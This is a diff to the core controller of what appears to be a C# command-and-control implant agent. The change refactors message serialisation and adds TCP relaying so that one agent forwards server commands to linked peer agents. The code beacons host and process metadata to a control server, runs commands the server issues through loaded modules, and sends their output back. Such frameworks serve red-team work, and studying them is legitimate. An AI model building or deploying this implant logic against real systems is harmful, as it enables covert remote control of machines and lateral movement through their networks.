@@ -1,51 +1,69 @@
 ﻿using System;
-using System.IO;
-using System.Text;
 using System.Linq;
 using System.Collections.Generic;
-using System.Runtime.Serialization.Json;
+
+using C2.Models;
 
 using Agent.Models;
+using Agent.Modules;
 using Agent.Interfaces;
 
 namespace Agent.Controllers
 {
     public class AgentController
     {
-        protected ConfigurationController configController;
-        protected ICommModule commModule;
-        protected AgentStatus agentStatus;
-        
-        public delegate void OnAgentCommand(string data, AgentController agentController, ConfigurationController configController);
+        protected ConfigController ConfigController { get; set; }
+        protected ICommModule CommModule { get; set; }
+        protected AgentStatus AgentStatus { get; set; }
+
+        public delegate void OnAgentCommand(string data, AgentController agentController, ConfigController configController);
         protected List<AgentModuleInfo> loadedModules = new List<AgentModuleInfo>();
 
-        internal AgentController(ConfigurationController config, ICommModule comm)
+        protected Dictionary<TcpAgent, TCPRelay> tcpRelays = new Dictionary<TcpAgent, TCPRelay>();
+        
+
+        internal AgentController(ConfigController ConfigController, ICommModule CommModule)
         {
-            configController = config;
-            commModule = comm;
+            this.ConfigController = ConfigController;
+            this.CommModule = CommModule;
         }
 
         internal void Run()
         {
-            agentStatus = AgentStatus.Running;
-            commModule.Run();
+            AgentStatus = AgentStatus.Running;
+            CommModule.Run();
 
-            while (agentStatus == AgentStatus.Running)
+            while (AgentStatus == AgentStatus.Running)
             {
-                C2Data data;
-                if (commModule.RecvData(out data) == true)
-                    HandleData(data);
+                foreach (var relay in tcpRelays.Values)
+                    if (relay.GarbageOut(out AgentMessage relayData) == true)
+                        CommModule.SendData(relayData);
+
+                if (CommModule.RecvData(out AgentMessage message) == true)
+                {
+                    var c2Data = C2.Helpers.Deserialise<C2Data>(message.Data);
+                    if (string.IsNullOrEmpty(c2Data.AgentId))
+                        HandleData(c2Data);
+                    else if(!c2Data.AgentId.Equals((string)ConfigController.GetOption(ConfigurationSettings.AgentId), StringComparison.OrdinalIgnoreCase))
+                        foreach (var relay in tcpRelays.Values)
+                            relay.GarbageIn(message);
+                    else
+                        HandleData(c2Data);
+                }
             }
+
+            foreach (var relay in tcpRelays.Values)
+                relay.Stop();
         }
 
         internal void Stop()
         {
-            agentStatus = AgentStatus.Stopped;
+            AgentStatus = AgentStatus.Stopped;
         }
 
         internal void AddAgentModule(IAgentModule module)
         {
-            module.Initialise(this, configController);
+            module.Initialise(this, ConfigController);
         }
 
         public void RegisterAgentModule(AgentModuleInfo module)
@@ -55,81 +73,112 @@ namespace Agent.Controllers
 
         internal void InitialCheckIn(InitialMetadata metadata)
         {
-            var agentId = (string)configController.GetOption(ConfigurationSettings.AgentId);
-            //var data = string.Format("{0}|{1}|{2}|{3}|{4}", agentId, metadata.ComputerName, metadata.Identity, metadata.ProcessName, metadata.ProcessId);
-
-            var ms = new MemoryStream();
-            var ser = new DataContractJsonSerializer(typeof(InitialMetadata));
-            ser.WriteObject(ms, metadata);
-            var json = ms.ToArray();
-            ms.Close();
-            var data = Encoding.UTF8.GetString(json, 0, json.Length);
-
-            commModule.SendData(new C2Data()
+            var c2Data = new C2Data
             {
-                AgentId = agentId,
+                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                 Module = "Core",
                 Command = "InitialCheckin",
-                Data = data
-            });
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(metadata))
+            };
+
+            var message = new AgentMessage
+            {
+                AgentId = c2Data.AgentId,
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
+            };
+
+            CommModule.SendData(message);
         }
 
         public void SendCommandOutput(string data)
         {
-            commModule.SendData(new C2Data()
+            var c2Data = new C2Data
             {
-                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
+                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                 Module = "Core",
                 Command = "CommandOutput",
                 Data = data
-            });
+            };
+
+            var message = new AgentMessage
+            {
+                AgentId = c2Data.AgentId,
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
+            };
+
+            CommModule.SendData(message);
         }
 
         public void SendModuleData(string module, string command, string data)
         {
-            commModule.SendData(new C2Data()
+            var c2Data = new C2Data
             {
-                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
+                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                 Module = module,
                 Command = command,
                 Data = data
-            });
+            };
+
+            var message = new AgentMessage
+            {
+                AgentId = c2Data.AgentId,
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
+            };
+
+            CommModule.SendData(message);
         }
 
         public void SendModuleRegistered(AgentModuleInfo module)
         {
-            var ms = new MemoryStream();
-            var ser = new DataContractJsonSerializer(typeof(AgentModuleInfo));
-            ser.WriteObject(ms, module);
-            var json = ms.ToArray();
-            ms.Close();
-            var data = Encoding.UTF8.GetString(json, 0, json.Length);
-
-            commModule.SendData(new C2Data()
+            var c2Data = new C2Data
             {
-                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
+                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                 Module = "Core",
                 Command = "ModuleRegistered",
-                Data = data
-            });
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(module))
+            };
+
+            var message = new AgentMessage
+            {
+                AgentId = c2Data.AgentId,
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
+            };
+
+            CommModule.SendData(message);
         }
 
         public void SendError(string module, string command, string data)
         {
-            commModule.SendData(new C2Data()
+            var c2Data = new C2Data
             {
-                AgentId = (string)configController.GetOption(ConfigurationSettings.AgentId),
+                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                 Module = "Core",
                 Command = "AgentError",
                 Data = string.Format("{0}|{1}|{2}", module, command, data)
-            });
+            };
+
+            var message = new AgentMessage
+            {
+                AgentId = c2Data.AgentId,
+                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
+            };
+
+            CommModule.SendData(message);
+        }
+
+        public void LinkTCPAgent(string address, int port)
+        {
+            var tcpAgent = new TcpAgent { Address = address, Port = port };
+            var tcpRelay = new TCPRelay(ConfigController);
+            tcpRelay.LinkTCPAgent(tcpAgent);
+            tcpRelays.Add(tcpAgent, tcpRelay);
         }
 
         private void HandleData(C2Data data)
         {
             var commands = loadedModules.Where(m => m.Name.Equals(data.Module, StringComparison.OrdinalIgnoreCase)).Select(m => m.Commands).FirstOrDefault();
             if (commands != null)
-                commands.Where(c => c.Name.Equals(data.Command, StringComparison.OrdinalIgnoreCase)).Select(c => c.Callback).FirstOrDefault()?.Invoke(data.Data, this, configController);
+                commands.Where(c => c.Name.Equals(data.Command, StringComparison.OrdinalIgnoreCase)).Select(c => c.Callback).FirstOrDefault()?.Invoke(data.Data, this, ConfigController);
         }
     }
 }
